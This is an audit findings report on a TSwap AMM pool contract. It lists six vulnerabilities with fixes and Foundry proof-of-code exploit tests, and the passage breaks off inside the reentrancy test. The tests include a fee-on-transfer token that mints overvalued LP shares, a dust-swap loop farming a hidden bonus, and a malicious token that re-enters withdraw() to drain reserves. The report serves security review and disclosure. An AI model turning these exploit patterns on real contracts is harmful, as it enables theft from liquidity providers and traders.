# 5 t swap audit - Findings Report
## Commit hash: 7bd52c6a75f1115b23e0cff0fa16f7c522703fcd

##Findings by Pattern


 **Derived From** : LP minted before transfers + no balance checks allows deflationary deposits to steal

[M-1]. TSwapPool.deposit mints LP using declared inputs before pulling funds, letting fee-on-transfer tokens mint overvalued shares and drain reserves
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Wrong constant in getInputAmountBasedOnOutput (10000 vs 1000) breaks AMM symmetry

[H-2]. Exact-output swaps overcharge ~10x due to wrong scaling in TSwapPool.getInputAmountBasedOnOutput, letting LPs siphon value
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : 10th-swap bonus silently transfers 1e18 tokens from reserves, violating x*y=k

[H-3]. Every 10th swap drains 1e18 of output token from reserves, breaking x*y=k and letting EOAs farm LP funds
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Reentrancy via early bonus transfer in _swap (untrusted call before input collected)

[H-4]. Reentrancy via bonus transfer in TSwapPool._swap lets attacker withdraw LP before input is pulled, stealing reserves
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Swap overpays when input token is fee-on-transfer, draining pool reserves

[H-5]. swapExactInput pays out based on nominal inputAmount instead of actual received, breaking x*y=k for fee-on-transfer tokens
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : swapExactInput returns 0 due to missing return assignment (broken integrations)

[M-6]. TSwapPool.swapExactInput returns 0 instead of actual output, breaking routers and causing stuck/incorrectly forwarded proceeds
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 4
- M: 2
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : LP minted before transfers + no balance checks allows deflationary deposits to steal

## [M-1]. TSwapPool.deposit mints LP using declared inputs before pulling funds, letting fee-on-transfer tokens mint overvalued shares and drain reserves

## Derived From Pattern/Invariant
LP minted before transfers + no balance checks allows deflationary deposits to steal

## Exploit Type
AccountingInvariantViolation

## Location
TSwapPool.deposit

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
TSwapPool.deposit computes LP shares from the user-declared wethToDeposit and reserves, then calls _addLiquidityMintAndTransfer which mints LP to msg.sender before pulling tokens via safeTransferFrom. There is no before/after balance check to confirm the pool actually received the quoted amounts. With a fee-on-transfer (deflationary) token, the pool receives less than poolTokensToDeposit (or WETH if taxed), yet LP was already minted at full value assuming exact inputs. The attacker can deposit with a fee-on-transfer pool token, get LP shares overvalued relative to actual received amounts, then immediately withdraw to extract an untaxed share of the pool’s reserves. Vulnerable snippet:

function _addLiquidityMintAndTransfer(uint256 wethToDeposit, uint256 poolTokensToDeposit, uint256 liquidityTokensToMint) private {
    _mint(msg.sender, liquidityTokensToMint); // mint before receiving funds
    i_wethToken.safeTransferFrom(msg.sender, address(this), wethToDeposit);
    i_poolToken.safeTransferFrom(msg.sender, address(this), poolTokensToDeposit);
}

Impact: breaks the ratio invariant and enables value extraction from existing LPs whenever a fee-on-transfer token is used.

## Impact
Attacker mints LP at full value despite the pool receiving fewer tokens, then withdraws a disproportionate slice of reserves, stealing real pool tokens from LPs and breaking the reserve ratio invariant.

## Command to Run Test
forge test --match-path test/M-TSwapPool-deposit-mi.t.sol --match-test testDeposit_MintsBeforeTransfer_AllowsFOTToMintOvervaluedShares -vvv

## Proof of Concept
1) Honest LP seeds the pool with WETH and a fee-on-transfer pool token (or attacker first seeds and later LPs join). 2) Attacker calls deposit with wethToDeposit and maximumPoolTokensToDeposit computed by getPoolTokensToDepositBasedOnWeth. 3) LP is minted immediately using wethToDeposit before tokens are transferred. 4) Because the pool token is fee-on-transfer, less than poolTokensToDeposit actually arrives. 5) Attacker immediately withdraws their freshly minted LP to receive an untaxed proportional share of both reserves. 6) Net result: attacker ends up with more pool tokens than they contributed to the pool (they also pocket the transfer fee if it routes to them), while WETH and pool token reserves are reduced versus the honest LP’s expectation.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract FeeOnTransferToken is ERC20, Ownable {
    uint256 public feeBps; // e.g., 1000 = 10%
    address public feeRecipient;
    mapping(address => bool) public isExempt; // fee applies if !isExempt[from]

    constructor(string memory name_, string memory symbol_, uint256 _feeBps, address _feeRecipient)
        ERC20(name_, symbol_)
        Ownable(msg.sender)
    {
        feeBps = _feeBps;
        feeRecipient = _feeRecipient;
    }

    function setExempt(address account, bool exempt) external onlyOwner {
        isExempt[account] = exempt;
    }

    function setFeeRecipient(address _feeRecipient) external onlyOwner {
        feeRecipient = _feeRecipient;
    }

    function setFeeBps(uint256 _feeBps) external onlyOwner {
        require(_feeBps <= 2000, "fee too high");
        feeBps = _feeBps;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    // OZ v5: override _update to apply fee on transfers (not on mint/burn)
    function _update(address from, address to, uint256 value) internal virtual override {
        if (from != address(0) && to != address(0) && !isExempt[from] && feeBps > 0 && feeRecipient != address(0)) {
            uint256 fee = (value * feeBps) / 10_000;
            uint256 net = value - fee;
            // take fee to feeRecipient
            super._update(from, feeRecipient, fee);
            super._update(from, to, net);
        } else {
            super._update(from, to, value);
        }
    }
}

contract M_TSwapPool_Deposit_MintsBeforeTransfer_FOT_Test is Test {
    ERC20Mock internal weth;
    FeeOnTransferToken internal poolToken; // Fee-on-transfer token
    TSwapPool internal pool;

    address internal honestLP;
    address internal attacker;

    uint256 constant ONE = 1e18;

    function setUp() public {
        // Deterministic addresses without makeAddr to keep compatibility
        honestLP = address(uint160(uint256(keccak256("honestLP"))));
        attacker = address(uint160(uint256(keccak256("attacker"))));

        // Deploy tokens
        weth = new ERC20Mock(); // 18 decimals mock WETH
        poolToken = new FeeOnTransferToken("FOT", "FOT", 1000, attacker); // 10% fee to attacker

        // Deploy pool
        pool = new TSwapPool(address(poolToken), address(weth), "LP-Token", "LP");

        // Exempt honest LP and the pool itself from fees-on-transfer outgoing side
        // Fee applies if !isExempt[from], so:
        // - honestLP exempt => initial deposit not taxed
        // - pool exempt => withdraws from pool won't be taxed
        poolToken.setExempt(honestLP, true);
        poolToken.setExempt(address(pool), true);

        // Mint balances
        uint256 big = 1_000_000 * ONE;
        weth.mint(honestLP, big);
        poolToken.mint(honestLP, big);
        weth.mint(attacker, big);
        poolToken.mint(attacker, big);

        // Approvals
        vm.startPrank(honestLP);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(attacker);
        weth.approve(address(pool), type(uint256).max);
        poolToken.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function testDeposit_MintsBeforeTransfer_AllowsFOTToMintOvervaluedShares() public {
        // Honest LP seeds the pool 1:1 ratio without fee
        uint256 initialWeth = 100 * ONE;
        uint256 initialPool = 100 * ONE;

        vm.startPrank(honestLP);
        // deposit() initial branch: maximumPoolTokensToDeposit actually used as the pool deposit
        pool.deposit(initialWeth, 0, initialPool, 0);
        vm.stopPrank();

        // Sanity check reserves after initial deposit
        assertEq(weth.balanceOf(address(pool)), initialWeth, "initial WETH reserves incorrect");
        assertEq(poolToken.balanceOf(address(pool)), initialPool, "initial poolToken reserves incorrect");
        assertEq(pool.totalSupply(), initialWeth, "initial LP supply should equal initial WETH");
        assertEq(pool.balanceOf(honestLP), initialWeth, "honest LP should own all LP initially");

        // Attacker performs deflationary deposit: declares 10 WETH and matched pool tokens
        uint256 atkWeth = 10 * ONE;
        uint256 expectedPoolTokensToDeposit = pool.getPoolTokensToDepositBasedOnWeth(atkWeth); // should be 10e18
        assertEq(expectedPoolTokensToDeposit, atkWeth, "expected pool tokens to deposit mismatch");

        // Capture attacker's FOT balance before
        uint256 atkPoolBalBefore = poolToken.balanceOf(attacker);

        vm.startPrank(attacker);
        // This call will MINT 10 LP to attacker BEFORE pulling funds
        uint256 lpMinted = pool.deposit(atkWeth, 0, expectedPoolTokensToDeposit, 0);
        vm.stopPrank();
        assertEq(lpMinted, atkWeth, "attacker should receive 10 LP");
        assertEq(pool.balanceOf(attacker), atkWeth, "attacker LP balance incorrect after deposit");

        // Because of fee-on-transfer (10%), pool received only 9 pool tokens, but full 10 WETH
        assertEq(weth.balanceOf(address(pool)), initialWeth + atkWeth, "pool WETH after attacker deposit incorrect");
        // pool tokens should be 100 + 9 = 109e18
        assertEq(poolToken.balanceOf(address(pool)), 109 * ONE, "pool tokens after attacker deposit should be 109");

        // Total LP supply is 110e18 now
        assertEq(pool.totalSupply(), 110 * ONE, "LP total supply after attacker deposit incorrect");

        // Attacker immediately withdraws their LP to capture overvalued share
        vm.startPrank(attacker);
        // Set very small mins to avoid reverts, and a valid deadline
        pool.withdraw(lpMinted, 1, 1, uint64(block.timestamp + 1));
        vm.stopPrank();

        // After withdrawing 10/110 share, reserves should be:
        // WETH: 110 - 10 = 100
        // PoolToken: 109 - floor(109*10/110) = 109 - ~9.909... = ~99.0909
        assertEq(weth.balanceOf(address(pool)), initialWeth, "pool WETH should be back to 100 after attacker withdraw");
        uint256 finalPoolReserves = poolToken.balanceOf(address(pool));
        assertLt(finalPoolReserves, initialPool, "pool token reserves should have been drained below initial");

        // Calculate attacker profit in pool tokens:
        // They sent 10e18, but fee redirected 1e18 back to attacker, so net sent ~9e18.
        // They withdrew ~9.909e18 untaxed, net profit ~0.909e18 from existing LPs.
        uint256 atkPoolBalAfter = poolToken.balanceOf(attacker);
        uint256 atkPoolDelta = atkPoolBalAfter - atkPoolBalBefore;
        assertGt(atkPoolDelta, 0, "attacker should have positive net gain of pool tokens");
        // Expect roughly ~0.909e18 gain (allowing small diff due to truncation)
        // Lower bound 0.9e18 for stability
        assertGt(atkPoolDelta, 9e17, "attacker gain should be > 0.9 tokens");

        // Honest LP is harmed: their redeemable pool tokens per LP share decreased
        // i.e., pool now holds < 100 pool tokens while still 100 LP supply for honest LP
        assertEq(pool.totalSupply(), initialWeth, "LP supply should be back to 100 (honest LP only)");
        assertLt(poolToken.balanceOf(address(pool)), initialPool, "honest LP reserves of pool token were diluted");
    }
}


## Suggested Mitigation
Pull tokens first, measure actual received amounts, and mint LP only from those amounts. For both the initial and subsequent deposits: 1) Record pre-balances for WETH and pool token; 2) transferFrom the user; 3) compute wethReceived and poolReceived via post-balance deltas; 4) For non-initial deposits, recompute liquidityTokensToMint from wethReceived and enforce that poolReceived preserves the current price ratio within the user’s max/min slippage; 5) For the initial deposit, mint based on wethReceived and use poolReceived actually received; 6) Only then _mint LP. If fee-on-transfer or other non-standard tokens are not supported, additionally require received == requested for both assets and revert otherwise, documenting the incompatibility.





 **Derived From** : Wrong constant in getInputAmountBasedOnOutput (10000 vs 1000) breaks AMM symmetry

## [H-2]. Exact-output swaps overcharge ~10x due to wrong scaling in TSwapPool.getInputAmountBasedOnOutput, letting LPs siphon value

## Derived From Pattern/Invariant
Wrong constant in getInputAmountBasedOnOutput (10000 vs 1000) breaks AMM symmetry

## Exploit Type
StandardViolation

## Location
TSwapPool.getInputAmountBasedOnOutput

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
TSwapPool.getInputAmountBasedOnOutput misapplies a 10000 scaling factor instead of 1000 and omits the +1 rounding, diverging from standard 0.3% fee constant-product math used by getOutputAmountBasedOnInput. Vulnerable line: return ((inputReserves * outputAmount) * 10000) / ((outputReserves - outputAmount) * 997); This overestimates required input by ~10x for exact-output swaps. Any liquidity provider can passively profit: wait for users to call swapExactOutput (or the sellPoolTokens wrapper that routes into swapExactOutput), then immediately withdraw LP to realize a pro-rata share of the victim’s excess input. This is a StandardViolation causing broken integration symmetry and direct trader losses.

## Impact
Users performing exact-output swaps overpay roughly 10x the correct input; LPs gain the excess as instantaneous value. An attacker can deposit minimal liquidity, let a victim execute swapExactOutput, then withdraw to capture a pro-rata share of the victim’s excess payment.

## Command to Run Test
forge test --match-path test/H-Exact-output-swaps-o.t.sol --match-test testExactOutputOverchargeAndLPProfit -vvv

## Proof of Concept
1) Attacker seeds the pool with symmetric liquidity (e.g., 100 WETH + 100 TOKEN). 2) Victim requests exact 10 WETH via swapExactOutput(TOKEN->WETH). Due to 10000 scaling, inputPaid ≈ 111 TOKEN instead of ≈ 12 TOKEN. 3) Attacker immediately withdraws LP shares and receives a pro-rata portion of the victim’s excess TOKEN, resulting in net positive TOKEN balance (profit), while the victim suffers a direct loss. 4) This can be farmed passively by any LP on every exact-output trade, including via the sellPoolTokens wrapper which incorrectly fixes output to the caller’s argument.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract H_ExactOutputSwaps_Overcharge_Test is Test {
    ERC20Mock internal weth;
    ERC20Mock internal token;
    TSwapPool internal pool;

    address internal attacker = address(uint160(uint256(keccak256("attacker"))));
    address internal victim = address(uint160(uint256(keccak256("victim"))));

    function setUp() public {
        // Deploy mock tokens
        weth = new ERC20Mock();
        token = new ERC20Mock();

        // Deploy pool (token, weth)
        pool = new TSwapPool(address(token), address(weth), "LP-Token", "LP");

        // Mint balances
        uint256 big = 1_000_000e18;
        token.mint(attacker, big);
        weth.mint(attacker, big);
        token.mint(victim, big);

        // Labels for readability
        vm.label(attacker, "attacker");
        vm.label(victim, "victim");
        vm.label(address(token), "POOL_TOKEN");
        vm.label(address(weth), "WETH");
        vm.label(address(pool), "TSwapPool");
    }

    function _correctInputAmount(uint256 outputAmount, uint256 inputReserves, uint256 outputReserves) internal pure returns (uint256) {
        // Standard Uniswap-style exact-output with 0.3% fee, scaled by 1000 and rounded up
        uint256 numerator = inputReserves * outputAmount * 1000;
        uint256 denominator = (outputReserves - outputAmount) * 997;
        return (numerator / denominator) + 1;
    }

    function testExactOutputOverchargeAndLPProfit() public {
        // 1) Attacker seeds the pool with symmetric liquidity: 100 WETH + 100 TOKEN
        uint256 initialWeth = 100e18;
        uint256 initialToken = 100e18;

        vm.startPrank(attacker);
        weth.approve(address(pool), type(uint256).max);
        token.approve(address(pool), type(uint256).max);
        uint256 attackerTokenStart = token.balanceOf(attacker);
        uint256 attackerWethStart = weth.balanceOf(attacker);

        // Initial deposit path uses maximumPoolTokensToDeposit as exact token deposit
        pool.deposit(initialWeth, initialWeth, initialToken, 0);
        vm.stopPrank();

        // Sanity: reserves should now be 100 WETH, 100 TOKEN
        assertEq(weth.balanceOf(address(pool)), initialWeth, "WETH reserve mismatch after deposit");
        assertEq(token.balanceOf(address(pool)), initialToken, "TOKEN reserve mismatch after deposit");

        // 2) Victim requests exact 10 WETH out via swapExactOutput (TOKEN -> WETH)
        uint256 outWeth = 10e18;
        vm.startPrank(victim);
        token.approve(address(pool), type(uint256).max);

        uint256 inResBefore = token.balanceOf(address(pool));
        uint256 outResBefore = weth.balanceOf(address(pool));
        uint256 correctInput = _correctInputAmount(outWeth, inResBefore, outResBefore); // ~11e18

        uint256 victimTokenStart = token.balanceOf(victim);
        // Executes using the buggy getInputAmountBasedOnOutput (uses 10000 instead of 1000 and no +1)
        uint256 inputPaid = pool.swapExactOutput(token, weth, outWeth, uint64(block.timestamp));
        uint256 victimTokenSpent = victimTokenStart - token.balanceOf(victim);
        vm.stopPrank();

        // Verify victim paid per the buggy formula (and overpaid roughly 10x vs correct)
        uint256 incorrectInput = ((inResBefore * outWeth) * 10000) / ((outResBefore - outWeth) * 997);
        assertEq(inputPaid, incorrectInput, "Pool did not use buggy 10000-scaling formula");

        // Overcharge is huge: inputPaid should be about 10x the correct input
        // Allow conservative bound > 9x to avoid rounding sensitivity
        assertGt(inputPaid, correctInput * 9, "Overcharge not significant (expected ~10x)");
        assertEq(victimTokenSpent, inputPaid, "Victim token spend mismatch");

        // 3) Attacker immediately withdraws LP to capture the victim's excess input
        // Attacker owns 100% of LP supply, so they will receive the entire reserve state
        vm.startPrank(attacker);
        uint256 lpToBurn = pool.totalLiquidityTokenSupply();
        // Non-zero mins per function requirements
        pool.withdraw(lpToBurn, 1, 1, uint64(block.timestamp));
        vm.stopPrank();

        // 4) Check profit materialization for LP
        // With only one LP, after victim overpays inputPaid TOKEN and takes outWeth WETH, attacker withdraws:
        // - WETH returned ≈ initialWeth - outWeth
        // - TOKEN returned ≈ initialToken + inputPaid
        uint256 attackerTokenEnd = token.balanceOf(attacker);
        uint256 attackerWethEnd = weth.balanceOf(attacker);

        uint256 attackerTokenProfit = attackerTokenEnd - attackerTokenStart; // Net change in TOKEN after round-trip
        int256 attackerWethChange = int256(attackerWethEnd) - int256(attackerWethStart); // Expected negative ~ -10e18

        // Attacker's TOKEN profit equals the victim's inputPaid (entire input accrued to reserves/LP)
        assertEq(attackerTokenProfit, inputPaid, "LP did not capture full victim overpayment");
        // Attacker loses exactly the WETH the victim withdrew
        assertEq(attackerWethChange, -int256(outWeth), "Unexpected WETH delta for LP");

        // The excess beyond correctInput is pure, immediate value siphoned to LP
        uint256 excess = inputPaid - correctInput;
        assertGt(excess, correctInput * 8, "Excess not sufficiently large (expected >> correct)");
    }
}


## Suggested Mitigation
Use standard Uniswap-style exact-output math with correct scaling and rounding up: replace body with: return ((inputReserves * outputAmount * 1000) / ((outputReserves - outputAmount) * 997)) + 1; Ensure symmetry with getOutputAmountBasedOnInput and add +1 to round up.





 **Derived From** : 10th-swap bonus silently transfers 1e18 tokens from reserves, violating x*y=k

## [H-3]. Every 10th swap drains 1e18 of output token from reserves, breaking x*y=k and letting EOAs farm LP funds

## Derived From Pattern/Invariant
10th-swap bonus silently transfers 1e18 tokens from reserves, violating x*y=k

## Exploit Type
AccountingInvariantViolation

## Location
TSwapPool._swap

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
TSwapPool._swap increments a counter and on every 10th call transfers 1e18 of outputToken to msg.sender directly from pool reserves without updating any accounting. This unconditional transfer reduces reserves and violates the constant-product invariant, directly diluting LPs. Attackers can cheaply farm the bonus by spamming minimal swaps with minOut=0: the first 9 swaps can output 0 to just increment the counter; the 10th swap gives the attacker 1e18 tokens (e.g., 1 WETH) for negligible input. Vulnerable snippet: if (swap_count >= SWAP_COUNT_MAX) { swap_count = 0; outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000); } Because swapExactInput computes amounts using pre-swap reserves while the giveaway is executed inside _swap before transfers finalize, the actual reserves drop further than the pricing formula expects, making k decrease.

## Impact
Attacker can siphon 1e18 of the chosen output token (including WETH) every 10 swaps; pool reserves shrink, k decreases, LPs lose assets and price integrity is broken. Repeatable for unbounded theft.

## Command to Run Test
forge test --match-path test/H-Every-10th-swap-drai.t.sol --match-test testEvery10thSwapDrainsOneEtherFromReserves -vvv

## Proof of Concept
- LP seeds the pool with substantial WETH and token liquidity.
- Attacker approves minimal amounts.
- Execute 9 swaps with inputAmount=1 wei and minOut=0 to increment the internal counter; these swaps typically output 0 due to rounding, costing the attacker negligible value.
- On the 10th swap, before normal transfers, the contract sends an extra 1e18 of the output token (choose WETH to ensure 18 decimals and sufficient reserves) directly from the pool to the attacker, without updating accounting.
- Observe attacker balance increases by exactly 1e18 WETH from the bonus alone, and the pool’s x*y product decreases, proving reserve theft and invariant violation.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import "../src/TSwapPool.sol";

contract HEvery10thSwapDrainTest is Test {
    ERC20Mock private weth;
    ERC20Mock private token;
    TSwapPool private pool;

    address private lp = address(0x1111);
    address private attacker = address(0x9999);

    function setUp() public {
        // Deploy mock tokens
        weth = new ERC20Mock();
        token = new ERC20Mock();
        // Deploy pool
        pool = new TSwapPool(address(token), address(weth), "LP-TOKEN", "LP");

        // Seed LP with large balances and add liquidity
        uint256 wethToDeposit = 10_000 ether;
        uint256 tokenToDeposit = 10_000 ether;

        // Mint tokens to LP
        weth.mint(lp, wethToDeposit);
        token.mint(lp, tokenToDeposit);

        // Approve and deposit
        vm.startPrank(lp);
        weth.approve(address(pool), type(uint256).max);
        token.approve(address(pool), type(uint256).max);
        // Initial deposit path: uses maximumPoolTokensToDeposit as exact token deposit
        pool.deposit(wethToDeposit, 0, tokenToDeposit, uint64(block.timestamp));
        vm.stopPrank();

        // Seed attacker with a small amount of pool token to spam swaps
        token.mint(attacker, 1000);
        vm.startPrank(attacker);
        token.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function testEvery10thSwapDrainsOneEtherFromReserves() public {
        // Ensure pool has sufficient WETH reserves
        uint256 initialWethRes = weth.balanceOf(address(pool));
        assertGt(initialWethRes, 1 ether, "Pool must have > 1e18 WETH");

        // Attacker performs 9 dust swaps to increment counter
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 9; i++) {
            pool.swapExactInput(token, 1, weth, 0, uint64(block.timestamp)); // likely outputs 0 due to rounding
        }

        // Capture k after 9th swap (should be non-decreasing under normal AMM behavior)
        uint256 wethResBefore10 = weth.balanceOf(address(pool));
        uint256 tokenResBefore10 = token.balanceOf(address(pool));
        uint256 kAfter9 = wethResBefore10 * tokenResBefore10;

        // Compute expected normal output for the 10th 1-wei swap using pre-swap reserves
        uint256 expectedOut = pool.getOutputAmountBasedOnInput(1, tokenResBefore10, wethResBefore10);

        // Attacker WETH balance before 10th swap
        uint256 attackerWethBefore = weth.balanceOf(attacker);

        // 10th swap triggers the hidden 1e18 bonus from pool reserves
        pool.swapExactInput(token, 1, weth, 0, uint64(block.timestamp));

        // Attacker WETH gained should equal expectedOut + 1e18 bonus
        uint256 attackerWethAfter = weth.balanceOf(attacker);
        uint256 actualReceived = attackerWethAfter - attackerWethBefore;
        assertEq(actualReceived, expectedOut + 1 ether, "Attacker received unexpected amount; bonus not accounted");

        // Verify pool reserves product decreased (violates x*y=k monotonicity with fees)
        uint256 wethResAfter10 = weth.balanceOf(address(pool));
        uint256 tokenResAfter10 = token.balanceOf(address(pool));
        uint256 kAfter10 = wethResAfter10 * tokenResAfter10;
        assertLt(kAfter10, kAfter9, "k should decrease due to unaccounted 1e18 drain");

        vm.stopPrank();
    }
}


## Suggested Mitigation
- Remove the giveaway entirely; swaps must never mutate reserves outside the swap math or without corresponding accounting.
- If a promotional reward is required, fund it from a separate reward vault/treasury, not from pool reserves, and transfer only after pulling input and ensuring the trade won’t revert. Do not assume token minting is possible for arbitrary ERC20s.
- Alternatively, accrue rewards as protocol-owned LP fees or via an external incentive contract where users claim rewards, leaving pool reserves and x*y=k invariant intact.





 **Derived From** : Reentrancy via early bonus transfer in _swap (untrusted call before input collected)

## [H-4]. Reentrancy via bonus transfer in TSwapPool._swap lets attacker withdraw LP before input is pulled, stealing reserves

## Derived From Pattern/Invariant
Reentrancy via early bonus transfer in _swap (untrusted call before input collected)

## Exploit Type
Reentrancy

## Location
TSwapPool._swap

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: AllTestPass
## Minimim Privilege Required
Permissionless

## Description
TSwapPool._swap transfers outputToken bonus before collecting input, making an external call to an untrusted token while state is inconsistent and without a reentrancy guard. A malicious pool token can reenter during the bonus transfer and call withdraw() using pre-held LP, draining reserves before the input is collected and before final output is sent. This breaks the x*y=k assumptions and enables net theft of WETH/pool tokens. Vulnerable snippet:

function _swap(IERC20 inputToken, uint256 inputAmount, IERC20 outputToken, uint256 outputAmount) private {
    if (_isUnknown(inputToken) || _isUnknown(outputToken) || inputToken == outputToken) {
        revert TSwapPool__InvalidToken();
    }

    swap_count++;
    if (swap_count >= SWAP_COUNT_MAX) {
        swap_count = 0;
        outputToken.safeTransfer(msg.sender, 1e18); // external call before collecting input
    }
    emit Swap(msg.sender, inputToken, inputAmount, outputToken, outputAmount);

    inputToken.safeTransferFrom(msg.sender, address(this), inputAmount); // input collected after
    outputToken.safeTransfer(msg.sender, outputAmount);
}

## Impact
Attacker reenters on the bonus transfer to call withdraw() with their LP, draining a large share of WETH and pool tokens before input is collected; net theft of reserves and broken invariant.

## Command to Run Test
forge test --match-path test/H-Reentrancy-via-bonus.t.sol --match-test testReentrancy_via_bonus_drains_before_input_pulled -vvv

## Proof of Concept
- Attacker deploys a malicious ERC20 as the pool token and creates a pool via PoolFactory.
- Attacker provides initial liquidity to receive LP tokens, and approves WETH/pool tokens.
- Attacker performs 9 tiny swaps to set swap_count to 9.
- On the 10th swap (input=WETH, output=malicious token), _swap triggers the bonus transfer to attacker.
- The malicious token’s transfer hook reenters and calls withdraw() burning a large share of LP, withdrawing WETH and pool tokens while the swap hasn’t yet pulled the input.
- Swap resumes, pulls the small WETH input and sends a small output amount; attacker keeps the withdrawn reserves plus bonus, achieving net profit.
- Pool WETH reserves decrease far more than the swap input, proving theft.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "src/PoolFactory.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract MaliciousToken is ERC20 {
    address public pool;
    IERC20 public weth;

    bool public armed;       // set true to trigger reentrancy on the next pool->transfer
    bool private inAttack;   // reentrancy guard inside token to avoid recursive loops

    constructor() ERC20("MAL", "MAL") {}

    function setPoolAndWeth(address _pool, address _weth) external {
        pool = _pool;
        weth = IERC20(_weth);
    }

    function mintTo(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function arm() external {
        armed = true;
    }

    // This function makes the token contract itself provide liquidity, so LP tokens are owned by the token contract.
    function provideLiquidityAsToken(uint256 wethAmount, uint256 tokenAmount) external {
        // Approve pool to pull both WETH and MAL from this token contract
        weth.approve(pool, type(uint256).max); // external call; owner = this contract
        // IMPORTANT: ensure the allowance owner is this contract, not the external caller
        IERC20(address(this)).approve(pool, type(uint256).max);
        // For initial deposit, liquidityTokensToMint = wethAmount. maximumPoolTokensToDeposit is used directly.
        TSwapPool(pool).deposit(wethAmount, 0, tokenAmount, uint64(block.timestamp));
    }

    // Hook on every transfer/transferFrom. We reenter only when:
    //  - caller is the pool (i.e., pool is transferring MAL), AND
    //  - 'armed' is true, AND
    //  - we are not already in an attack (inAttack == false)
    function _update(address from, address to, uint256 value) internal override {
        bool trigger = (msg.sender == pool) && armed && !inAttack;
        if (trigger) {
            inAttack = true;
            // Drain using LP owned by this token contract before the swap has collected input
            uint256 lpBal = TSwapPool(pool).balanceOf(address(this));
            if (lpBal > 0) {
                TSwapPool(pool).withdraw(lpBal, 1, 1, uint64(block.timestamp));
            }
            // Only attack once
            armed = false;
            inAttack = false;
        }
        super._update(from, to, value);
    }
}

contract H_Reentrancy_via_bonus_Test is Test {
    ERC20Mock private weth;
    MaliciousToken private mal;
    PoolFactory private factory;
    TSwapPool private pool;

    address private attacker = address(0xA11CE);
    address private lp2 = address(0xB0B);

    function setUp() public {
        vm.label(attacker, "attacker");
        vm.label(lp2, "lp2");

        // Deploy tokens
        weth = new ERC20Mock();
        mal = new MaliciousToken();

        // Deploy factory and create pool
        factory = new PoolFactory(address(weth));
        address poolAddr = factory.createPool(address(mal));
        pool = TSwapPool(poolAddr);

        // Configure malicious token with pool and weth addresses
        mal.setPoolAndWeth(address(pool), address(weth));

        // Mint supplies
        // Token contract will deposit initial liquidity, so give it WETH and MAL
        uint256 initialEach = 100 ether;
        weth.mint(address(mal), initialEach);
        mal.mintTo(address(mal), initialEach);

        // Second LP (lp2) provides matching liquidity so pool keeps some reserves after reentrancy
        weth.mint(lp2, initialEach);
        mal.mintTo(lp2, initialEach);

        // Attacker funds for swaps
        weth.mint(attacker, 10 ether);
        mal.mintTo(attacker, 10 ether);

        // Token contract provides initial liquidity (LP tokens minted to token contract)
        mal.provideLiquidityAsToken(initialEach, initialEach);

        // Second LP deposits same ratio
        vm.startPrank(lp2);
        weth.approve(address(pool), type(uint256).max);
        mal.approve(address(pool), type(uint256).max);
        // for subsequent deposits, compute required pool tokens
        uint256 wethToDeposit = initialEach;
        uint256 poolTokensToDeposit = pool.getPoolTokensToDepositBasedOnWeth(wethToDeposit);
        pool.deposit(wethToDeposit, 0, poolTokensToDeposit, uint64(block.timestamp));
        vm.stopPrank();

        // Sanity: total reserves now roughly 200 ether each; LP supply ~= 200 ether
        assertGt(weth.balanceOf(address(pool)), 0);
        assertGt(mal.balanceOf(address(pool)), 0);
        assertEq(pool.balanceOf(address(mal)) > 0, true);
    }

    function _smallWarmupSwaps(uint256 n) internal {
        // Do n small swaps to increment swap_count to n (we aim for 9)
        // Use MAL -> WETH direction so bonus transfer (to MAL) doesn't trigger before the 10th swap
        vm.startPrank(attacker);
        mal.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        for (uint256 i = 0; i < n; i++) {
            // swap a tiny amount of MAL for WETH; minOut set to 1 to avoid zero
